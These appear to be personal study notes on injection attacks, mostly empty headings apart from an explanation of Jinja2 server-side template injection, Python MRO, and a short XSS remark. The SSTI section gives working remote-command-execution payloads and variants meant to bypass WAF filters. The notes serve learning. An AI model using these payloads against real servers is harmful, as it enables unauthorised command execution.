# Injection Attacks  

## SOAP Injection  

## SMTP Injection  

## Command Injection  

## Code Injection  

## SQL Injection


## Server Side Template Injection (SSTI)   

### What is an SSTI?   
<blockquote>
A server side template injection is a vulnerability that occurs when a server renders user input as a template of some sort. Templates can be used when only minor details of a page need to change from circumstance to circumstance. For example, depending on the IP that accesses a site, the site may look like:

    <h1>Welcome to the page!</h1>
    <u>This page is being accessed from the remote address: {{ip}}</u>
    
Instead of creating a whole new page per person that accesses the site, it will simply render the remote address into the {{ip}} variable, while reusing the rest of the HTML for each person request the server receives to that endpoint.

This can be abused, since some template engines support some fairly complex functionality, that eventually allow for developers to run commands or file contents straight from the template.

So when the power to create and render templates is given to a user, it can lead to full access to the system, as the user running the webserver.
</blockquote>   

### What is MRO?  
* Method Resolution Order (MRO) is the order in which Python looks for a method in a hierarchy of classes.
* It plays a vital role in the context of multiple inheritance as single method may be found in multiple super classes.  
  ```python
  class A:
      def process(self):
          print('A process()')

  class B:
      def process(self):
          print('B process()')

  class C(A, B):
      def process(self):
          print('C process()')

  class D(C,B):
      pass

  obj = D()
  obj.process()

  print(D.mro())
  ```    

* This script will output the following 
  ```python
  [<class '__main__.D'>, <class '__main__.C'>, <class '__main__.A'>, <class '__main__.B'>, <class 'object'>]
  ```  

* This MRO functionality will come in extremely handy for building python SSTI Jinja2 payloads   

### We Can Get RCE Through SSTI with the Following   

<blockquote>
I initially built the following payload for remote command execution, and will now try and apply as many filter bypasses as I can. `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`

If the waf blocks “.": `{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}`

If the waf blocks “.” and “_": `{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}`
</blockquote>   

### Does that Mean if we block the use of `{{}}` we can protect the application from SSTI?   

* No. There are 2 other methods we can use templates in Jinja apps which is via using hashes and the other using these `{% %}`.   


### For More Info  
* If the link is still working check it out it's got nice content. <a href="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/">Link!</a>  

<br/> <br/>

## XSS (Cross Site Scripting)   
* It's like Javascript injection.
* I just realized that maybe I can inject javascript that made a call to the back-end that was not supposed to happen.
* That's why the Sammy that exploited a Stored XSS in MySpace was able to add himself as a friend when users visited his profile page that he had the javascript injected in it.x